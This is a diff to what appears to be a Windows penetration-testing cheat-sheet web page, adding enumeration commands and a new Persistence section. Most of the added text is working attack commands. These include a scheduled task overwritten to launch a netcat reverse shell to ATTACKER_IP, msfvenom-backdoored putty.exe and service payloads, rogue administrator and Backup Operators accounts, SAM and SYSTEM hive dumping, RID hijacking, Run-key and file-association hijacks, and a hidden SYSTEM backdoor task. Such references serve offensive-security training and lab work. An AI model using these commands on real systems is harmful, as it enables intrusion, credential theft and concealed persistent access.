@@ -86,7 +86,7 @@
                     "all">All</button></span> <span id=
                     "tags"><button class=
                     "Enum">Enumeration</button> <button class=
-                    "Exploit">Exploitation</button> <button class=
+                    "Exploit">Exploitation</button> <button class="P">Persistence</button> <button class=
                     "Kernel">Kernel Exploits</button></span>
                   </div>
                   <form class="f1" action="">
@@ -118,6 +118,7 @@ whoami /priv &lt;# privilege info #&gt;
 whoami /groups &lt;# group info #&gt;
 net user &lt;# shows all users #&gt;
 net user *user* &lt;# shows user info for targeted user #&gt;
+net localgroup
 net localgroup administrators &lt;# shows administrator group info #&gt;
 icacls file &lt;#use to check perm on executable#&gt;</code></pre>
                     </div>
@@ -127,7 +128,8 @@ icacls file &lt;#use to check perm on executable#&gt;</code></pre>
                     "language-powershell">ipconfig /all &lt;# network info #&gt;
 arp -a &lt;# checks arp tables #&gt;
 route print &lt;# shows what devices are being commed with #&gt;
-netstat -ano &lt;# shows ports; very helpful #&gt;</code></pre>
+netstat -ano &lt;# shows ports; very helpful, -b will list program names#&gt;
+net share </code></pre>
                     </div>
                     <h3>Service</h3>
                     <div>
@@ -223,8 +225,16 @@ hashcat -m 1000 --force &lt;hash&gt; /usr/share/wordlists</code></pre>
                     <h3>Scheduled Tasks</h3>
                     <div>
                       <pre><code class=
-                    "language-powershell">accesschk.exe /accepteula -quvw user C:DevToolsCleanUp.ps1
-echo C:PrivEscreverse.exe &gt;&gt; C:DevToolsCleanUp.ps1</code></pre>
+                    "language-powershell">#list scheduled tasks
+schtasks
+#retrieve info about command
+schtasks /query /tn vulntask /fo list /v
+#privileges/permissions
+accesschk.exe /accepteula -quvw user c:\tasks\schtask.bat
+icacls c:\tasks\schtask.bat
+#overwrite the task to run
+echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 &gt; C:\tasks\schtask.bat
+schtasks /run /tn vulntask</code></pre>
                     </div>
                     <h3>Bypass Upload Access Denied</h3>
                     <div>
@@ -236,6 +246,110 @@ echo C:PrivEscreverse.exe &gt;&gt; C:DevToolsCleanUp.ps1</code></pre>
                       <pre><code class=
                     "language-powershell">runas /env /profile /user:&lt;DOMAIN/PC&gt;Administrator "C:tempnc.exe -e cmd.exe </code></pre>
                   </div>
+                  <div class="P">
+                    <div id="P"></div>
+                    <h2>Persistence</h2>
+                    <h3>Accounts</h3>
+                    <div>
+                      <h4>Groups</h4>
+                      <div>
+                        <pre><code class="language-powershell">#Add users to groups
+#add to admins
+net localgroup administrators user123 /add
+#add to backup, more subtle, privs ignore DACL, copy SAM and SYSTEM then crack hashes
+net localgroup "Backup Operators" user123 /add
+#add rdp
+net localgroup "Remote Management Users" user123 /add
+
+#logging in remotely may pose issues, if UAC blocks token policy below
+reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
+
+#download SAM and SYSTEM
+reg save hklm\system system.bak
+reg save hklm\sam sam.bak
+
+download system.bak
+download sam.bak
+</code></pre>
+                      </div>
+                      <h4>Special Privileges</h4>
+                      <div>
+                        <pre><code class="language-powershell">#assigning privileges
+secedit /export /cfg config.inf
+
+#modifying security descriptors
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+
+#RID Hijacking, the default rid for admin is 500
+#list sids, rid is last section
+wmic useraccount get name,sid
+
+#psexec can be used to run regedit as SYSTEM
+PsExec64.exe -i -s regedit
+
+#RID will be in HKLM\SAM\SAM\Domains\Account\Users\
+#search for a key with its RID in hex (1010 = 0x3F2)
+#effective RID is in F
+#in little endian
+#RID of Administrator in hex (500 = 0x01F4)
+</code></pre>
+                      </div>
+                    </div>
+                    <h3>Files</h3>
+                    <div>
+                      <pre><code class="language-bash">#Modifying exe payloads
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
+
+#Modify an existing shortcut to point to a different binary
+#Example calc.exe
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445" 
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
+
+#Hijacking File Associations
+#HKLM\Software\Classes\
+#When we id a target filetype, such as .txt, we will find an associated progID under data.
+#The progID will also be in HKLM\Software\Classes\
+#Change the data to powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1</code></pre>
+                    </div>
+                    <h3>Services</h3>
+                    <div>
+                      <pre><code class="language-powershell">msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
+#Transfer to victime
+sc.exe create exampleService binPath= "C:\windows\rev-svc.exe" start= auto
+sc.exe start exampleService
+
+#We can also change an existing service
+sc.exe config exampleService binPath= "C:\windows\rev-svc2.exe" start= auto obj= "LocalSystem"
+
+#Startup
+C:\Users\&lt;your_username&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
+#make rev
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=x.x.x.x LPORT=4450 -f exe -o revshell.exe
+copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
+
+
+#Alternatively
+
+#    HKCU\Software\Microsoft\Windows\CurrentVersion\Run
+#    HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
+#    HKLM\Software\Microsoft\Windows\CurrentVersion\Run
+#    HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
+
+move revshell.exe C:\Windows
+
+#Create REG_EXPAND_SZ in one of the above with data pointing to revshell
+</code></pre>
+                    </div>
+                    <h3>Scheduled Tasks</h3>
+                    <div>
+                      <pre><code class="language-powershell">#Create a taskschtasks /create /sc minute /mo 1 /tn backdoorTask /tr "c:\tools\nc64 -e cmd.exe x.x.x.x 4449" /ru SYSTEM
+#We can then hide the task
+PsExec64.exe -s -i regedit
+#HKLM\Software\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\backdoorTask
+#Delete SD
+
+</code></pre>
+                    </div>
                   </div>
                   <div class="Kernel">
                     <h2>Kernel Exploits</h2>
